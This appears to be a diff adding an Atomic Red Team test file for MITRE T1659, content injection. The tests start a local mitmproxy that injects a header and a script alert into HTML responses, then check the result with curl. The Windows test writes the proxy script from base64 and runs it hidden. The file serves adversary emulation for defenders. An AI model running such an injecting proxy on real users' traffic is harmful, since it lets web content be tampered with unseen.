@@ -1,1 +1,125 @@
+attack_technique: T1659
+display_name: Content Injection
+atomic_tests:
+  - name: Start MITM Proxy Injection
+    description: Start mitmdump proxy with injection script.
+    supported_platforms:
+      - macos
+      - linux
 
+    dependencies:
+      - description: mitmproxy must be installed
+        prereq_command: |
+          mitmdump --version
+        get_prereq_command: |
+          python3 -m pip install mitmproxy || brew install mitmproxy
+
+    executor:
+      name: bash
+      command: |
+        printf "from mitmproxy import http\ndef response(flow: http.HTTPFlow):\n    if 'text/html' in flow.response.headers.get('content-type',''):\n        flow.response.headers['X-Atomic']='T1659'\n        flow.response.text = flow.response.text.replace('</body>', '<script>alert(\"Atomic T1659 Injection\")</script></body>')" > /tmp/atomic_t1659_inject.py
+        (mitmdump -s /tmp/atomic_t1659_inject.py -p 8080 > /tmp/atomic_t1659.log 2>&1 &)
+        echo "Waiting for proxy to bind to port 8080..."
+        sleep 5
+        lsof -i tcp:8080 || (echo "Proxy failed to start. Check /tmp/atomic_t1659.log" && exit 1)
+        ls -l /tmp/
+
+      cleanup_command: |
+        rm -rf /tmp/atomic_t1659_inject.py
+        rm -rf /tmp/atomic_t1659.log
+        pkill -f mitmdump || true
+
+  - name: Generate Traffic & Verify Injected Header
+    description: Send HTTP request through proxy and verify injected header.
+    supported_platforms:
+      - macos
+      - linux
+
+    dependencies:
+      - description: curl must be available
+        prereq_command: |
+          curl --version
+        get_prereq_command: |
+          echo "Install curl using package manager"
+
+    executor:
+      name: bash
+      command: |
+        echo "--- Checking for Injected Header ---"
+        curl -skI --proxy http://127.0.0.1:8080 http://example.com > /tmp/curl_out.txt
+        grep "X-Atomic" /tmp/curl_out.txt || (echo "Header not found. Full response:" && cat /tmp/curl_out.txt && exit 1)
+      cleanup_command: |
+        rm -rf /tmp/curl_out.txt
+        
+
+  - name: Validate HTML Content Injection
+    description: Send web request through proxy and verify JavaScript injection into HTML response body.
+    supported_platforms:
+      - macos
+      - linux
+
+    dependencies:
+      - description: Proxy must be running on port 8080
+        prereq_command: |
+          lsof -i tcp:8080
+        get_prereq_command: |
+          echo "Run Test 1 to start proxy"
+
+    executor:
+      name: bash
+      command: |
+        echo "--- Validating Injected HTML Content ---"
+        curl -sk --proxy http://127.0.0.1:8080 http://example.com > /tmp/atomic_t1659_page.html
+        grep -q "Atomic T1659 Injection" /tmp/atomic_t1659_page.html && (echo "Content injection successful"; grep "Atomic T1659 Injection" /tmp/atomic_t1659_page.html) || (echo "Injection not detected. Showing sample output:"; head -20 /tmp/atomic_t1659_page.html; exit 1)
+        echo "--- Opening modified HTML file ---"
+        (open -a "Safari" /tmp/atomic_t1659_page.html 2>/dev/null || xdg-open /tmp/atomic_t1659_page.html 2>/dev/null || echo "Open file manually: /tmp/atomic_t1659_page.html")
+      cleanup_command: |
+        rm -rf /tmp/atomic_t1659_page.html
+        pkill -x "Safari" || pkill -f "firefox|chrome|msedge|chromium" || echo "No browser process found to kill"
+        ls -l /tmp/
+        
+
+  - name: Start MITM Proxy Injection (Windows)
+    description: Start mitmdump proxy with injection script in the background.
+    supported_platforms:
+      - windows
+    dependencies:
+      - description: mitmproxy must be installed and in PATH
+        prereq_command: |
+          if (Get-Command mitmdump -ErrorAction SilentlyContinue) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+          python -m pip install mitmproxy
+    executor:
+      name: powershell
+      elevation_required: false
+      command: |
+        $code = 'ZnJvbSBtaXRtcHJveHkgaW1wb3J0IGh0dHANCmRlZiByZXNwb25zZShmbG93OiBodHRwLkhUVFBGbG93KToNCiAgICBpZiAidGV4dC9odG1sIiBpbiBmbG93LnJlc3BvbnNlLmhlYWRlcnMuZ2V0KCJjb250ZW50LXR5cGUiLCIiKToNCiAgICAgICAgZmxvdy5yZXNwb25zZS5oZWFkZXJzWyJYLUF0b21pYyJdPSJUMTY1OSINCiAgICAgICAgZmxvdy5yZXNwb25zZS50ZXh0ID0gZmxvdy5yZXNwb25zZS50ZXh0LnJlcGxhY2UoIjwvYm9keT4iLCAiPHNjcmlwdD5hbGVydCgnQXRvbWljIFQxNjU5IEluamVjdGlvbicpPC9zY3JpcHQ+PC9ib2R5PiIp'; [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($code)) | Out-File -FilePath "$env:TEMP\atomic_t1659_inject.py" -Encoding ascii; Start-Process "mitmdump" "-s $env:TEMP\atomic_t1659_inject.py -p 8080" -WindowStyle Hidden; Write-Host "Proxy starting on 8080..."; Start-Sleep -Seconds 5; Get-NetTCPConnection -LocalPort 8080
+      cleanup_command: |
+        Stop-Process -Name "mitmdump" -ErrorAction SilentlyContinue
+        Remove-Item "$env:TEMP\atomic_t1659_inject.py" -ErrorAction SilentlyContinue
+        Remove-Item "$env:TEMP\atomic_t1659.log" -ErrorAction SilentlyContinue
+
+  - name: Generate Traffic & Verify Injected Header (Windows)
+    description: Send HTTP request through proxy and verify injected header.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        Write-Host "--- Checking for Injected Header ---"
+        curl.exe -skI --proxy http://127.0.0.1:8080 http://example.com | Tee-Object -FilePath "$env:TEMP\curl_out.txt"
+        if (Select-String -Path "$env:TEMP\curl_out.txt" -Pattern "X-Atomic") { Write-Host "Header injection detected!" } else { Write-Error "Header not found"; exit 1 }
+      cleanup_command: |
+        Remove-Item "$env:TEMP\curl_out.txt" -ErrorAction SilentlyContinue
+
+  - name: Validate HTML Content Injection (Windows)
+    description: Send web request through proxy and verify JavaScript injection into HTML response.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        Write-Host "--- Validating Injected HTML Content ---"; $OutPath = "$env:TEMP\atomic_t1659_page.html"; curl.exe -sk --proxy http://127.0.0.1:8080 http://example.com | Out-File -FilePath $OutPath -Encoding utf8; $Content = Get-Content -Path $OutPath -Raw; if ($Content -match "Atomic T1659 Injection") { Write-Host "Content injection successful"; Select-String -Path $OutPath -Pattern "Atomic T1659 Injection"; Write-Host "--- Opening modified HTML file ---"; Start-Process $OutPath } else { Write-Host "Injection not detected. Showing sample output:"; Get-Content -Path $OutPath -TotalCount 20; Start-Process "msedge.exe" $OutPath; exit 1 }
+      cleanup_command: |
+        Stop-Process -Name "msedge", "chrome", "firefox" -ErrorAction SilentlyContinue
+        Remove-Item "$env:TEMP\atomic_t1659_page.html" -ErrorAction SilentlyContinue
